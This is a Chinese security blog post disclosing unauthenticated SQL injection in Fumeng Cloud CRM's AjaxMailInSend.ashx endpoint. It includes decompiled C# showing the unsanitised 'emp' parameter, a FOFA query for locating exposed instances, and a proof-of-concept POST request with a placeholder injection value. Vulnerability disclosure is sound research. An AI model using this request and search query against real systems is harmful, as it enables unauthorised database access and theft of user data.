---
title: "孚盟云CRM AjaxMailInSend.ashx 多个SQL注入漏洞"
source: https://mrxn.net/jswz/fumacrm-Dingding-Ajax-AjaxMailInSend-sqli.html
asset_dir: assets/孚盟云crm-ajaxmailinsend.ashx-多个sql注入漏洞
---

# 孚盟云CRM AjaxMailInSend.ashx 多个SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2026/1/19 08:31
* 368浏览
* [4评论](#comment)
* 16分钟阅读

(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

上海孚盟软件有限公司是一家专业的外贸SaaS服务和行业解决方案提供商。其旗下产品孚盟云AjaxMailInSend.ashx接口存在多个[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，未经身份验证的远程攻击者除了可以利用 SQL注入漏洞获取数据库中的信息(例如，管理员后台密码、站点的用户个人信息)之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

客户关系管理

# 影响版本

# fofa语法

> app="孚盟软件-孚盟云"

# 漏洞分析

直接看 `AjaxMailInSend.ashx` 对应的dll文件 `FumaCRM_BS.NewWeb.dll` 里有关 **AjaxMailInSend** 方法的实现如下

```
public void ProcessRequest(HttpContext context)
{
  new SqlAndHtmlChecker(context.Request, context.Response).Check();
  Helper.WriteLog("内分发开始begin", "mailinsend");
  context.Response.ContentType = "text/plain";
  string str1 = UserCookie.GetCookieValue("empId");
  if (!string.IsNullOrEmpty(str1))
    str1 = FumaCRM_BS.Utility.Encrypt.Encrypt.DesDecrypt(str1);
  string str2 = context.Request["action"];
  if (!string.op_Equality(str2, "autoMailTranRuler"))
  {
    if (!string.op_Equality(str2, "getEmpAndImg"))
      return;
    this.getEmpAndImg(context, str1);
  }
  else
    this.NoAutoMailTranRuler(context.Request["fid"], context.Request["mid"], context.Request["emp"], Convert.ToBoolean(context.Request["auotTrans"]), Convert.ToBoolean(context.Request["transFlag"]), Convert.ToBoolean(context.Request["noticeFlag"]), context.Request["memo"], str1, context);
}
```

当**action=autoMailTranRuler**时，看下`NoAutoMailTranRuler`方法的实现

SQL注入防护

[![孚盟云CRM AjaxMailInSend.ashx 多个SQL注入漏洞](images/img-001-c4053572e05f.webp)](https://image.mrxn.net/381d6a00b09743caac2b90bd89d91fc8.webp)

参数**emp**未经过任何过滤或校验就被直接拼接进SQL语句中进行执行，从而造成SQL注入漏洞。

当**action=getEmpAndImg**时，一样的存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞

[![孚盟云CRM AjaxMailInSend.ashx 多个SQL注入漏洞](images/img-002-bdb839b06ff2.webp)](https://image.mrxn.net/ed00e642944943b18ad2026ec08723f6.webp)

# 漏洞复现

```
POST /m/Dingding/Ajax/AjaxMailInSend.ashx HTTP/1.1
Host: fumacrm.mrxn.net
Cookie: UserCookie={"empId":"1"}
Content-Type: application/x-www-form-urlencoded

action=autoMailTranRuler&emp=1)SQLI_POC&fid=&mid=&auotTrans=false&transFlag=false&noticeFlag=false&memo=
```

[![孚盟云CRM AjaxMailInSend.ashx 多个SQL注入漏洞](images/img-003-0a86f41677b1.webp)](https://image.mrxn.net/65850bbda50849efb4466e5020b369e8.webp)

成功通过报错注入在响应回显数数据库用户信息

代码安全审计

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#0day](https://mrxn.net/tag/0day)
* [#asp.net](https://mrxn.net/tag/asp.net)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[孚盟云CRM AjaxMailInSend.ashx 多个SQL注入漏洞](https://mrxn.net/jswz/fumacrm-Dingding-Ajax-AjaxMailInSend-sqli.html)  
文章链接：<https://mrxn.net/jswz/fumacrm-Dingding-Ajax-AjaxMailInSend-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/fumacrm-Dingding-Ajax-AjaxMailInSend-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

漏洞预警服务

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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